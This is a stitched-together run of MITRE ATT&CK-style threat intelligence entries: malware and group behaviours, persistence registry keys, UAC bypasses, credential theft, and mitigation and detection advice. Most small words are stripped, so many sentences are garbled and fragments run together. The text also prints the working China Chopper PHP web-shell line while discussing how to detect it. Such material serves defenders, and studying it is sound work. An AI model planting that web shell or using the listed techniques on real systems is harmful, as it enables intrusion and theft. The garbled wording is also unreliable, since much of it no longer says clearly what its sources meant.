[PsExec](https://attack.mitre.org/software/S0029) deploy beacons compromised systems.(Citation: NCC Chimera January 2021) [Exaramel Linux](https://attack.mitre.org/software/S0401) <code>whoami</code> identify owner.(Citation: ANSSI Sandworm January 2021) [DropBook](https://attack.mitre.org/software/S0547) execute arbitrary commands victims' machines.(Citation: Cybereason Molerats Dec 2020)(Citation: BleepingComputer Molerats Dec 2020)  [Cobalt Group](https://attack.mitre.org/groups/G0080) compromised legitimate browser updates deliver backdoor. (Citation: Crowdstrike GTR2020 Mar 2020) (Citation: FireEye APT28)(Citation: Kaspersky Sofacy)(Citation: Securelist Sofacy Feb 2018)(Citation: Secureworks IRON TWILIGHT Active Measures March 2017) [Cobalt Strike](https://attack.mitre.org/software/S0154) ability Smart Applet attacks disable Java SecurityManager sandbox.(Citation: Talos Cobalt Strike September 2020)(Citation: Cobalt Strike Manual 4.3 November 2020) [Amadey](https://attack.mitre.org/software/S1025) checked variety antivirus products.(Citation: Korean FSI TA505 2020)(Citation: BlackBerry Amadey 2020) [RDAT](https://attack.mitre.org/software/S0495) Windows Video Service malicious services.(Citation: Unit42 RDAT July 2020) [Windshift](https://attack.mitre.org/groups/G0112) fake personas social media engage target victims.(Citation: SANS Windshift August 2018)	 [UPPERCUT](https://attack.mitre.org/software/S0275) capability time zone current timestamp victim’s machine.(Citation: FireEye APT10 Sept 2018) [Lazarus Group](https://attack.mitre.org/groups/G0032) VBA Macro set file attributes Hidden named files dot prefix hide Finder application.(Citation: McAfee Lazarus Resurfaces Feb 2018)(Citation: SentinelOne Lazarus macOS July 2020)(Citation: TrendMicro macOS Dacls 2020)(Citation: Lazarus APT January 2022) [SodaMaster](https://attack.mitre.org/software/S0627) ability "sleep" time.(Citation: Securelist APT10 March 2021) [APT28](https://attack.mitre.org/groups/G0007) open-source tools [Koadic](https://attack.mitre.org/software/S0250), [Mimikatz](https://attack.mitre.org/software/S0002), [Responder](https://attack.mitre.org/software/S0174).(Citation: Palo Alto Sofacy 06-2018)(Citation: Securelist Sofacy Feb 2018)(Citation: FireEye APT28 Hospitality Aug 2017) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. [Action RAT](https://attack.mitre.org/software/S1028) WMI gather AV products installed infected host.(Citation: MalwareBytes SideCopy Dec 2021) [KARAE](https://attack.mitre.org/software/S0215) distributed torrent file-sharing websites South Korean victims, YouTube video downloader application lure.(Citation: FireEye APT37 Feb 2018) [Kimsuky](https://attack.mitre.org/groups/G0094) disguised services benign software operating functions.(Citation: CISA AA20-301A Kimsuky) [Daserf](https://attack.mitre.org/software/S0187) download remote files.(Citation: Trend Micro Daserf Nov 2017)(Citation: Secureworks BRONZE BUTLER Oct 2017) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Efforts focus minimizing sensitivity data external parties. [Earth Lusca](https://attack.mitre.org/groups/G1006) VBA scripts.(Citation: TrendMicro EarthLusca 2022) [Rancor](https://attack.mitre.org/groups/G0075) VBS scripts embedded macros execution.(Citation: Rancor Unit42 June 2018) [Squirrelwaffle](https://attack.mitre.org/software/S1030) exfiltrated victim data POST requests C2 servers.(Citation: ZScaler Squirrelwaffle Sep 2021) Ensure developers administrators aware risk plaintext passwords software configuration files left endpoint systems servers. [TA505](https://attack.mitre.org/groups/G0092) .iso files deploy malicious .lnk files.(Citation: TrendMicro TA505 Aug 2019) [AuditCred](https://attack.mitre.org/software/S0347) utilize proxy communications.(Citation: TrendMicro Lazarus Nov 2018) (Citation: FireEye APT40 March 2019) Update password managers regularly employing patch management internal enterprise endpoints servers. [Moses Staff](https://attack.mitre.org/groups/G1009) collected administrator username compromised host.(Citation: Checkpoint MosesStaff Nov 2021) Configure browsers tasks regularly delete persistent cookies. [PoshC2](https://attack.mitre.org/software/S0378) modules local privilege escalation exploits CVE-2016-9192 CVE-2016-0099.(Citation: GitHub PoshC2) [Sibot](https://attack.mitre.org/software/S0589) executed scheduled task.(Citation: MSTIC NOBELIUM Mar 2021) [Cobalt Strike](https://attack.mitre.org/software/S0154) ability load DLLs reflective injection.(Citation: Talos Cobalt Strike September 2020)(Citation: Cobalt Strike Manual 4.3 November 2020) Monitor MBR VBR occur indicators suspicious activity analysis. snapshots MBR VBR compare samples. [Chaes](https://attack.mitre.org/software/S0631) <code>CreateFileW()</code> API function read permissions access downloaded payloads.(Citation: Cybereason Chaes Nov 2020)  [ccf32](https://attack.mitre.org/software/S1043) upload collected data files FTP server.(Citation: Bitdefender FunnyDream Campaign November 2020) [Olympic Destroyer](https://attack.mitre.org/software/S0365) API <code>ChangeServiceConfigW</code> disable services system.(Citation: Talos Olympic Destroyer 2018) [Windigo](https://attack.mitre.org/groups/G0124) script gather credentials files left disk OpenSSH backdoors.(Citation: ESET ForSSHe December 2018) [Remsec](https://attack.mitre.org/software/S0125) list active connections ports.(Citation: Kaspersky ProjectSauron Technical Analysis) [Zebrocy](https://attack.mitre.org/software/S0251) obtains additional code execute victim's machine, including downloading secondary payload.(Citation: Palo Alto Sofacy 06-2018)(Citation: Unit42 Cannon Nov 2018)(Citation: ESET Zebrocy 2019)(Citation: Accenture SNAKEMACKEREL Nov 2018) deep packet inspection artifacts common exploit traffic, payloads. [IcedID](https://attack.mitre.org/software/S0483) inject suspended msiexec.exe process send beacons C2 appearing normal msi application. (Citation: Juniper IcedID June 2020) [OutSteel](https://attack.mitre.org/software/S1017) relied user malicious link spearphishing email.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) [MURKYTOP](https://attack.mitre.org/software/S0233) capability delete local files.(Citation: FireEye Periscope March 2018) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. Monitor unusual network traffic additional tools transferred system.  network intrusion detection systems, SSL/TLS inspection, malicious scripts (recon, heap spray, browser identification scripts frequently reused), common script obfuscation, exploit code. [Rifdoor](https://attack.mitre.org/software/S0433) ability identify IP address compromised host.(Citation: Carbon Black HotCroissant April 2020) cloud service providers support content trust models require container images signed trusted sources.(Citation: Content trust Azure Container Registry)(Citation: Content trust Docker) [QakBot](https://attack.mitre.org/software/S0650) domain generation algorithms C2 communication.(Citation: Trend Micro Qakbot 2020) Monitor executed commands arguments search private key certificate files compromised systems insecurely stored credentials. [PowerDuke](https://attack.mitre.org/software/S0139) commands current directory size file. commands logical drives, drive type, space.(Citation: Volexity PowerDuke November 2016) [Hildegard](https://attack.mitre.org/software/S0601) IRC channel C2 communications.(Citation: Unit 42 Hildegard Malware) Limit privileges user accounts remediate Privilege Escalation vectors  authorized administrators create services. [BITTER](https://attack.mitre.org/groups/G1002) DDNS C2 communications.(Citation: Forcepoint BITTER Pakistan Oct 2016) [Lucifer](https://attack.mitre.org/software/S0532) persist setting Registry key values <code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\QQMusic</code> <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run\QQMusic</code>.(Citation: Unit 42 Lucifer June 2020) [Anchor](https://attack.mitre.org/software/S0504) create scheduled task persistence.(Citation: Cyberreason Anchor December 2019) [LaZagne](https://attack.mitre.org/software/S0349) credentials Vault files.(Citation: GitHub LaZagne Dec 2018)	 [APT29](https://attack.mitre.org/groups/G0016) stolen cookies access cloud resources, forged <code>duo-sid</code> cookie bypass MFA set email account.(Citation: Volexity SolarWinds)(Citation: CrowdStrike StellarParticle January 2022) [GrimAgent](https://attack.mitre.org/software/S0632) set persistence Registry key.(Citation: IB GrimAgent July 2021) [GrimAgent](https://attack.mitre.org/software/S0632) Windows Command execute commands, including removal.(Citation: IB GrimAgent July 2021) Monitor logged domain (DNS) data purchased domains targeting. Reputation/category-based detection difficult categorization updated. Detection efforts focused stages adversary lifecycle, Initial Access Command Control.  Prevent adversary access privileged accounts access perform technique. Check integrity existing BIOS EFI determine vulnerable modification. Patch BIOS EFI necessary. Trusted Platform Module technology. (Citation: TCG Trusted Platform Module) [CHOPSTICK](https://attack.mitre.org/software/S0023) proxy server victims C2 server.(Citation: ESET Sednit 2) Monitor newly constructed scheduled jobs. scheduled tasks persistence, adversary remove task action complete. Windows, enable "Microsoft-Windows-TaskScheduler/Operational" setting event logging service events logged scheduled task activity, including:(Citation: TechNet Forum Scheduled Task Operational Setting)

* Event 106 Windows 7, Server 2008 R2 - Scheduled task registered
* Event 4698 Windows 10, Server 2016 - Scheduled task created
* Event 4700 Windows 10, Server 2016 - Scheduled task enabled
* Event 4701 Windows 10, Server 2016 - Scheduled task disabled

Tools Sysinternals Autoruns detect attempts persistence, including listing current scheduled tasks. (Citation: TechNet Autoruns) [IceApple](https://attack.mitre.org/software/S1022) .NET assemblies `App_Web_` file names legitimate.(Citation: CrowdStrike IceApple 2022) (Citation: Symantec Elfin Mar 2019) [Gamaredon Group](https://attack.mitre.org/groups/G0047) downloaded additional malware tools compromised host.(Citation: Palo Alto Gamaredon Feb 2017)(Citation: TrendMicro Gamaredon April 2020)(Citation: ESET Gamaredon June 2020)(Citation: Actinium February 2022) Administrators block end-user consent OAuth applications, disabling users authorizing third-party apps OAuth 2.0 forcing administrative consent requests. block end-user registration applications users, reduce risk. Cloud Access Security Broker ban applications.

Azure offers couple enterprise policy settings Azure Management Portal help:

"Users -> User settings -> App registrations: Users register applications" set "no" prevent users registering applications. 
"Enterprise applications -> User settings -> Enterprise applications: Users consent apps accessing company data behalf" set "no" prevent users consenting third-party multi-tenant applications [Ajax Security Team](https://attack.mitre.org/groups/G0130) social media channels spearphish victims.(Citation: FireEye Operation Saffron Rose 2013) Monitor files establish persistence executing malicious content triggered user inactivity. [Operation Spalax](https://attack.mitre.org/campaigns/C0005), threat actors variety packers droppers decrypt malicious payloads.(Citation: ESET Operation Spalax Jan 2021) [EXOTIC LILY](https://attack.mitre.org/groups/G1011) e-mail notification features legitimate file sharing services spearphishing.(Citation: Google EXOTIC LILY March 2022) [Gallmaker](https://attack.mitre.org/groups/G0084) victims lure document warning victims “enable content” execution.(Citation: Symantec Gallmaker Oct 2018) [Kinsing](https://attack.mitre.org/software/S0599) searched private keys.(Citation: Aqua Kinsing April 2020) [APT39](https://attack.mitre.org/groups/G0087) modified LNK shortcuts.(Citation: FireEye APT39 Jan 2019) [Drovorub](https://attack.mitre.org/software/S0502) delete specific files compromised host.(Citation: NSA/FBI Drovorub August 2020) Monitor executed commands arguments disable services render services unavailable legitimate users. Monitor unexpected files gather credentials files rendered Require AppleScript signed trusted developer executed - prevent random AppleScript code executing.(Citation: applescript signing) subjects AppleScript code scrutiny .app files passing Gatekeeper. [GrimAgent](https://attack.mitre.org/software/S0632) ability set persistence Task Scheduler.(Citation: IB GrimAgent July 2021) [Empire](https://attack.mitre.org/software/S0363) perform port scans infected host.(Citation: Github PowerShell Empire) [BackConfig](https://attack.mitre.org/software/S0475) ability identify folders files previous infections.(Citation: Unit 42 BackConfig 2020)	 [Helminth](https://attack.mitre.org/software/S0170) samples signed legitimate, compromised code signing certificates owned software company Squared.(Citation: ClearSky OilRig Jan 2017) [HTTPBrowser](https://attack.mitre.org/software/S0070) established persistence setting <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code> key <code>wdm</code> path executable. Registry entry <code>HKEY_USERS\Software\Microsoft\Windows\CurrentVersion\Run vpdn “%ALLUSERPROFILE%\%APPDATA%\vpdn\VPDN_LU.exe”</code> establish persistence.(Citation: ZScaler Hacking Team)(Citation: ThreatStream Evasion Analysis) Trusted Platform Module technology secure trusted boot process prevent integrity compromised. (Citation: TCG Trusted Platform Module) (Citation: TechNet Secure Boot Process) Patch BIOS firmware prevent successful vulnerabilities. [Conficker](https://attack.mitre.org/software/S0608) copies <code>%systemroot%\system32</code> directory registers service.(Citation: SANS Conficker) [WarzoneRAT](https://attack.mitre.org/software/S0670) capability grab passwords numerous browsers Outlook Thunderbird email clients.(Citation: Check Warzone Feb 2020)(Citation: Uptycs Warzone UAC Bypass November 2020) [BLACKCOFFEE](https://attack.mitre.org/software/S0069) Microsoft’s TechNet portal encoded tag IP address command control server communicates separately IP address C2. C2 server discovered shut down, threat actors update encoded IP address TechNet maintain control victims’ machines.(Citation: FireEye APT17) rotating access days reduce effectiveness stolen credentials. [Valak](https://attack.mitre.org/software/S0476) ability base64 encode XOR encrypt strings.(Citation: Cybereason Valak 2020)(Citation: Unit 42 Valak July 2020)(Citation: SentinelOne Valak June 2020) [Trojan.Karagany](https://attack.mitre.org/software/S0094) monitor titles windows identify specific keywords.(Citation: Secureworks Karagany July 2019)	  [LOWBALL](https://attack.mitre.org/software/S0042) Dropbox API request files, file dropped malicious email attachment. meant mechanism update compromised host version [LOWBALL](https://attack.mitre.org/software/S0042) malware.(Citation: FireEye admin@338) [ThreatNeedle](https://attack.mitre.org/software/S0665) loaded Startup folder (`%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\OneDrives.lnk`) Shortcut file persistence.(Citation: Kaspersky ThreatNeedle Feb 2021) [Chaos](https://attack.mitre.org/software/S0220) reverse connection 8338/TCP, encrypted AES.(Citation: Chaos Stolen Backdoor) [Smoke Loader](https://attack.mitre.org/software/S0226) searches Outlook files directories inbox, sent, templates, drafts, archives, etc.).(Citation: Talos Smoke Loader July 2018) [Bankshot](https://attack.mitre.org/software/S0239) searches files victim's machine.(Citation: US-CERT Bankshot Dec 2017) [Spark](https://attack.mitre.org/software/S0543) packed Enigma Protector obfuscate contents.(Citation: Unit42 Molerat Mar 2020)  [HEXANE](https://attack.mitre.org/groups/G1001) registered operated domains campaigns, security technology theme impersonating targeted organization.(Citation: SecureWorks August 2019)(Citation: Dragos Hexane)(Citation: ClearSky Siamesekitten August 2021) [EvilBunny](https://attack.mitre.org/software/S0396) executed C2 commands HTTP.(Citation: Cyphort EvilBunny Dec 2014) (Citation: FireEye APT37 Feb 2018) [Leviathan](https://attack.mitre.org/groups/G0065) ssh internal reconnaissance.(Citation: FireEye APT40 March 2019) [VaporRage](https://attack.mitre.org/software/S0636) ability check presence specific DLL terminate found.(Citation: MSTIC Nobelium Toolset 2021) (Citation: FireEye APT38 Oct 2018)(Citation: LogRhythm WannaCry)(Citation: FireEye WannaCry 2017)(Citation: SecureWorks WannaCry Analysis) [TeamTNT](https://attack.mitre.org/groups/G0139) created local privileged users victim machines.(Citation: Intezer TeamTNT September 2020) [RTM](https://attack.mitre.org/software/S0148) resolved [Pony](https://attack.mitre.org/software/S0453) C2 server IP addresses converting Bitcoin blockchain transaction data specific octets, accessing IP addresses Namecoin blockchain.(Citation: CheckPoint Redaman October 2019)(Citation: Unit42 Redaman January 2019) [Kessel](https://attack.mitre.org/software/S0487) download additional modules C2 server.(Citation: ESET ForSSHe December 2018) (Citation: DFIR Conti Bazar Nov 2021) endpoint security solutions configured block types process injection based common sequences behavior occur injection process.  Monitor processes correlate software, patch cycles, etc., including comparing trusted baseline. [Mythic](https://attack.mitre.org/software/S0699) leverage modified SOCKS5 proxy tunnel egress C2 traffic.(Citation: Mythc Documentation) Ensure accounts privileges require. [PoetRAT](https://attack.mitre.org/software/S0428) registry modifications alter behavior execution.(Citation: Talos PoetRAT April 2020) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors script collect infected system.(Citation: FoxIT Wocao December 2019) Configure access controls firewalls limit access domain controllers systems create manage accounts. [Wizard Spider](https://attack.mitre.org/groups/G0102) publicly-available post-exploitation frameworks tools Metasploit, [Empire](https://attack.mitre.org/software/S0363), [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: FireEye KEGTAP SINGLEMALT October 2020) shells difficult detect. forms persistent remote access, initiate connections. portion server innocuous looking. PHP version China Chopper shell, example, short payload: (Citation: Lee 2013)
<code><?php @eval($_POST['password']);></code>
Nevertheless, detection mechanisms exist. Process monitoring detect servers perform suspicious actions spawning cmd.exe accessing files directory.(Citation: NSA Cyber Mitigating Shells) [Torisma](https://attack.mitre.org/software/S0678) encoded C2 communications Base64.(Citation: McAfee Lazarus Nov 2020) [Stuxnet](https://attack.mitre.org/software/S0603) calls LoadLibrary executes exports DLL.(Citation: Symantec W.32 Stuxnet Dossier) [APT29](https://attack.mitre.org/groups/G0016) leveraged privileged accounts replicate directory service data domain controllers.(Citation: 365 Defender Solorigate)(Citation: Deep Dive Solorigate January 2021)(Citation: CrowdStrike StellarParticle January 2022) [POWERTON](https://attack.mitre.org/software/S0371) AES encrypting C2 traffic.(Citation: FireEye APT33 Guardrail) [CosmicDuke](https://attack.mitre.org/software/S0050) collects LSA secrets.(Citation: F-Secure Dukes) Security applications behavior exploitation Windows Defender Exploit Guard (WDEG) Enhanced Mitigation Experience Toolkit (EMET) mitigate exploitation behavior. (Citation: TechNet Moving EMET) Control flow integrity checking identify software exploit occurring. (Citation: Wikipedia Control Flow Integrity) protections depend architecture target application binary compatibility software services targeted. [Comnie](https://attack.mitre.org/software/S0244) attempts detect anti-virus products.(Citation: Palo Alto Comnie) [PingPull](https://attack.mitre.org/software/S1031) enumerate storage volumes folder contents compromised host.(Citation: Unit 42 PingPull Jun 2022) [Aria-body](https://attack.mitre.org/software/S0456) ability decrypt loader configuration payload DLL.(Citation: CheckPoint Naikon 2020) [Cadelspy](https://attack.mitre.org/software/S0454) ability log keystrokes compromised host.(Citation: Symantec Chafer Dec 2015) [Bankshot](https://attack.mitre.org/software/S0239) modifies time file control server.(Citation: McAfee Bankshot) [Chaes](https://attack.mitre.org/software/S0631) Installutill download content.(Citation: Cybereason Chaes Nov 2020) [Comnie](https://attack.mitre.org/software/S0244) executes BAT scripts.(Citation: Palo Alto Comnie) [JPIN](https://attack.mitre.org/software/S0201) network information, including DNS, IP, proxies.(Citation: PLATINUM April 2016) Enforce principle privilege limiting container dashboard access users. [ccf32](https://attack.mitre.org/software/S1043) copied files remote machine infected [Chinoxy](https://attack.mitre.org/software/S1041) backdoor.(Citation: Bitdefender FunnyDream Campaign November 2020) filtering DHCP traffic ports 67 68 to/from unknown untrusted DHCP servers. Additionally, port security enabled layer switches. Furthermore, enabling DHCP snooping layer 2 switches prevent DHCP spoofing attacks starvation attacks. tracking IP addresses script tool. 

Additionally, block DHCPv6 traffic incoming router advertisements, IPv6 commonly network.(Citation: ntlm_relaying_kerberos_del) [EvilBunny](https://attack.mitre.org/software/S0396) WMI gather system.(Citation: Cyphort EvilBunny Dec 2014) Locations <code>profile.ps1</code> stored monitored modifications. (Citation: Malware Archaeology PowerShell Cheat Sheet) profile locations include:
* <code>$PsHome\Profile.ps1</code>
* <code>$PsHome\Microsoft.{HostProgram}_profile.ps1</code>
* <code>$Home\My Documents\PowerShell\Profile.ps1</code>
* <code>$Home\My Documents\PowerShell\Microsoft.{HostProgram}_profile.ps1</code> [Sakula](https://attack.mitre.org/software/S0074) single-byte XOR obfuscation obfuscate files.(Citation: Dell Sakula) [Cannon](https://attack.mitre.org/software/S0351) port 587 C2.(Citation: Unit42 Cannon Nov 2018) Security applications behavior exploitation Windows Defender Exploit Guard (WDEG) Enhanced Mitigation Experience Toolkit (EMET) mitigate exploitation behavior. (Citation: TechNet Moving EMET) Control flow integrity checking identify software exploit occurring. (Citation: Wikipedia Control Flow Integrity) protections depend architecture target application binary compatibility software components targeted privilege escalation. [GrimAgent](https://attack.mitre.org/software/S0632) collect data files compromised host.(Citation: IB GrimAgent July 2021) [Clambling](https://attack.mitre.org/software/S0660) wait 30 minutes initiating contact C2.(Citation: Trend Micro DRBControl February 2020) [Amadey](https://attack.mitre.org/software/S1025) variety Windows API calls, including `GetComputerNameA`, `GetUserNameA`, `CreateProcessA`.(Citation: BlackBerry Amadey 2020) Integrating multi-factor authentication (MFA) organizational policy greatly reduce risk adversary gaining control valid credentials additional tactics initial access, lateral movement, collecting information. MFA restrict access cloud resources APIs.  [Machete](https://attack.mitre.org/software/S0409) component check running processes browsers.(Citation: ESET Machete July 2019)  [Cuba](https://attack.mitre.org/software/S0625) discover shared resources <code>NetShareEnum</code> API call.(Citation: McAfee Cuba April 2021)  [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012), threat actors compromised domain administrator credentials lateral movement.(Citation: Cybereason OperationCuckooBees 2022)  [4H RAT](https://attack.mitre.org/software/S0065) capability file directory listings.(Citation: CrowdStrike Putter Panda) [PcShare](https://attack.mitre.org/software/S1050) proxy settings compromised machine `InternetQueryOptionA` IP address running `nslookup myip.opendns.comresolver1.opendns.com\r\n`.(Citation: Bitdefender FunnyDream Campaign November 2020) Monitor executed commands arguments scripts PubPrn.vbs proxy execution malicious files. [ShadowPad](https://attack.mitre.org/software/S0596) decrypted binary blob start execution.(Citation: Kaspersky ShadowPad Aug 2017) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors collected list connections infected `netstat` checks internet connection.(Citation: FoxIT Wocao December 2019) [Operation Sharpshooter](https://attack.mitre.org/campaigns/C0013), threat actors compromised server campaign's infrastructure.(Citation: Bleeping Op Sharpshooter March 2019) Windows 8.1 Server 2012 R2, enable LSA Protection setting Registry key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL</code> <code>dword:00000001</code>. (Citation: LSA Protection Mar 2014) LSA Protection ensures LSA plug-ins drivers loaded digitally signed signature adhere Security Development Lifecycle (SDL) process guidance.  [Doki](https://attack.mitre.org/software/S0600) DynDNS service DGA based Dogecoin blockchain generate C2 domains.(Citation: Intezer Doki July 20) [Dragonfly](https://attack.mitre.org/groups/G0035) injected SMB URLs malicious Word spearphishing attachments initiate [Forced Authentication](https://attack.mitre.org/techniques/T1187).(Citation: US-CERT TA18-074A) Disable LLMNR NetBIOS local security settings policy environment. (Citation: ADSecurity Windows Secure Baseline) [Fox Kitten](https://attack.mitre.org/groups/G0117) created local user account administrator privileges.(Citation: ClearSky Pay2Kitten December 2020) [OilRig](https://attack.mitre.org/groups/G0049) macros deliver malware [QUADAGENT](https://attack.mitre.org/software/S0269) [OopsIE](https://attack.mitre.org/software/S0264).(Citation: FireEye APT34 Dec 2017)(Citation: OilRig ISMAgent July 2017)(Citation: Unit 42 OopsIE! Feb 2018)(Citation: Unit 42 QUADAGENT July 2018)(Citation: Unit42 OilRig Nov 2018) [OilRig](https://attack.mitre.org/groups/G0049) batch scripts.(Citation: FireEye APT34 Dec 2017)(Citation: OilRig ISMAgent July 2017)(Citation: Unit 42 OopsIE! Feb 2018)(Citation: Unit 42 QUADAGENT July 2018)(Citation: Unit42 OilRig Nov 2018) [TeamTNT](https://attack.mitre.org/groups/G0139) searched services Alibaba Cloud Security's aliyun service BMC Helix Cloud Security's bmc-agent service disable them.(Citation: Cisco Talos Intelligence Group) Anti-virus automatically quarantine suspicious files. [REvil](https://attack.mitre.org/software/S0496) encrypted C2 communications ECIES algorithm.(Citation: Kaspersky Sodin July 2019) [Threat Group-3390](https://attack.mitre.org/groups/G0027) command-line interfaces execution.(Citation: SecureWorks BRONZE UNION June 2017)(Citation: Unit42 Emissary Panda 2019) [PowerSploit](https://attack.mitre.org/software/S0194)'s <code>Find-AVSignature</code> AntivirusBypass module locate single byte anti-virus signatures.(Citation: GitHub PowerSploit 2012)(Citation: PowerSploit Documentation) [Siloscape](https://attack.mitre.org/software/S0623) executed attacker gains initial access Windows container vulnerability.(Citation: Unit 42 Siloscape Jun 2021)  [Bazar](https://attack.mitre.org/software/S0534) launch cmd.exe perform reconnaissance commands.(Citation: Cybereason Bazar July 2020)(Citation: Zscaler Bazar September 2020) [Azorult](https://attack.mitre.org/software/S0344) check installed software Registry key <code>Software\Microsoft\Windows\CurrentVersion\Uninstall</code>.(Citation: Unit42 Azorult Nov 2018) [WarzoneRAT](https://attack.mitre.org/software/S0670) `sdclt.exe` bypass UAC Windows escalate privileges; Windows versions [WarzoneRAT](https://attack.mitre.org/software/S0670) IFileOperation exploit bypass UAC module.(Citation: Check Warzone Feb 2020)(Citation: Uptycs Warzone UAC Bypass November 2020) Monitor attempts enable scripts running considered suspicious. scripts commonly system, enabled, scripts running cycle patching administrator functions suspicious. Scripts captured file determine actions intent.  [Gazer](https://attack.mitre.org/software/S0168) custom encryption C2 RSA.(Citation: ESET Gazer Aug 2017)(Citation: Securelist WhiteBear Aug 2017) [Kimsuky](https://attack.mitre.org/groups/G0094) Blogspot C2.(Citation: Talos Kimsuky Nov 2021) [PipeMon](https://attack.mitre.org/software/S0501) collect send OS version C2 beacon.(Citation: ESET PipeMon 2020) [Attor](https://attack.mitre.org/software/S0438) detect executed virtualized emulated environment searching specific artifacts, communication I/O ports VM-specific instructions.(Citation: ESET Attor Oct 2019) [PsExec](https://attack.mitre.org/software/S0029), tool adversaries, writes programs <code>ADMIN$</code> network share execute commands remote systems.(Citation: PsExec Russinovich) [APT29](https://attack.mitre.org/groups/G0016) 7-Zip compress stolen emails password-protected archives prior exfiltration.(Citation: Volexity SolarWinds)(Citation: Deep Dive Solorigate January 2021)(Citation: CrowdStrike StellarParticle January 2022) [Shamoon](https://attack.mitre.org/software/S0140) obtains victim's operating version keyboard layout sends C2 server.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Unit 42 Shamoon3 2018) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors registered email accounts campaign.(Citation: FoxIT Wocao December 2019) [Zox](https://attack.mitre.org/software/S0672) encoded Base64.(Citation: Novetta-Axiom) [GALLIUM](https://attack.mitre.org/groups/G0093) established persistence [PoisonIvy](https://attack.mitre.org/software/S0012) created scheduled task.(Citation: Cybereason Soft Cell June 2019) [Javali](https://attack.mitre.org/software/S0528) delivered malicious links embedded e-mails.(Citation: Securelist Brazilian Banking Malware July 2020) [Lazarus Group](https://attack.mitre.org/groups/G0032) custom secure delete function overwrite file contents data heap memory.(Citation: Novetta Blockbuster) [4H RAT](https://attack.mitre.org/software/S0065) sends OS version identifier beacons.(Citation: CrowdStrike Putter Panda) [JPIN](https://attack.mitre.org/software/S0201) list running processes.(Citation: PLATINUM April 2016) [Leviathan](https://attack.mitre.org/groups/G0065) downloaded additional scripts files adversary-controlled servers.(Citation: Proofpoint Leviathan Oct 2017)(Citation: FireEye Periscope March 2018) [POWERSTATS](https://attack.mitre.org/software/S0223) disable Office Protected View changing Registry keys.(Citation: FireEye MuddyWater Mar 2018) [China Chopper](https://attack.mitre.org/software/S0020)'s server component executes code POST commands.(Citation: FireEye Periscope March 2018) [BloodHound](https://attack.mitre.org/software/S0521) compress data collected SharpHound ingestor ZIP file written disk.(Citation: GitHub Bloodhound) Monitor installation kernel modules abused escape containers host. (Citation: ESET Dukes October 2019)(Citation: Secureworks IRON HEMLOCK Profile) [Rocke](https://attack.mitre.org/groups/G0106) modified UPX headers packing files break unpackers.(Citation: Anomali Rocke March 2019) [SILENTTRINITY](https://attack.mitre.org/software/S0692) create memory dump LSASS `MiniDumpWriteDump Win32` API call.(Citation: GitHub SILENTTRINITY Modules July 2019) [FatDuke](https://attack.mitre.org/software/S0512) controlled custom C2 protocol HTTP.(Citation: ESET Dukes October 2019) [WastedLocker](https://attack.mitre.org/software/S0612) delete shadow volumes.(Citation: Symantec WastedLocker June 2020)(Citation: NCC WastedLocker June 2020)(Citation: Sentinel Labs WastedLocker July 2020)  [FALLCHILL](https://attack.mitre.org/software/S0181) search files victim.(Citation: US-CERT FALLCHILL Nov 2017) [Gelsemium](https://attack.mitre.org/software/S0666) delete dropper component targeted system.(Citation: ESET Gelsemium June 2021) [Attor](https://attack.mitre.org/software/S0438) Tor C2 communication.(Citation: ESET Attor Oct 2019) [Naikon](https://attack.mitre.org/groups/G0019) netbios scanner remote machine identification.(Citation: Bitdefender Naikon April 2021) [BADCALL](https://attack.mitre.org/software/S0245) disables Windows firewall binding port.(Citation: US-CERT BADCALL) 
Consider limiting access BITS interface specific users groups.(Citation: Symantec BITS 2007) (Citation: Rancor Unit42 June 2018) [GravityRAT](https://attack.mitre.org/software/S0237) <code>netstat</code> command ports victim’s machine.(Citation: Talos GravityRAT) [Hi-Zor](https://attack.mitre.org/software/S0087) communicates C2 server HTTPS.(Citation: Fidelis INOCNATION) Monitor analyze SSL/TLS traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). Filtering based DKIM+SPF header analysis detect email sender spoofed.(Citation: Anti Spoofing)(Citation: ACSC Email Spoofing) [pngdowner](https://attack.mitre.org/software/S0067) command control.(Citation: CrowdStrike Putter Panda) [Darkhotel](https://attack.mitre.org/groups/G0012) virus propagates infecting executables stored shared drives.(Citation: Kaspersky Darkhotel) New, benign processes created installation software. [Gamaredon Group](https://attack.mitre.org/groups/G0047) VNC tools, including UltraVNC, remotely interact compromised hosts.(Citation: Symantec Shuckworm January 2022)(Citation: Actinium February 2022)(Citation: Unit 42 Gamaredon February 2022) StartupItems deprecated, preventing users writing <code>/Library/StartupItems</code> directory prevent startup items registered. [KONNI](https://attack.mitre.org/software/S0356) FTP exfiltrate reconnaissance data out.(Citation: Medium KONNI Jan 2020) [MarkiRAT](https://attack.mitre.org/software/S0652) files carrying specific extensions as: .rtf, .doc, .docx, .xls, .xlsx, .ppt, .pptx, .pps, .ppsx, .txt, .gpg, .pkr, .kdbx, .key, .jpb.(Citation: Kaspersky Ferocious Kitten Jun 2021) [SDBbot](https://attack.mitre.org/software/S0461) ability inject downloaded DLL newly created rundll32.exe process.(Citation: Proofpoint TA505 October 2019) Monitor files hidden windows conceal malicious activity plain sight users. MacOS, plist files ASCII files specific format, easy parse. File monitoring check <code>apple.awt.UIElement</code> suspicious plist tag plist files flag them. [APT29](https://attack.mitre.org/groups/G0016) [AdFind](https://attack.mitre.org/software/S0552) enumerate domain groups.(Citation: CrowdStrike StellarParticle January 2022) [Ixeshe](https://attack.mitre.org/software/S0015) command control.(Citation: Moran 2013)(Citation: Trend Micro IXESHE 2012) 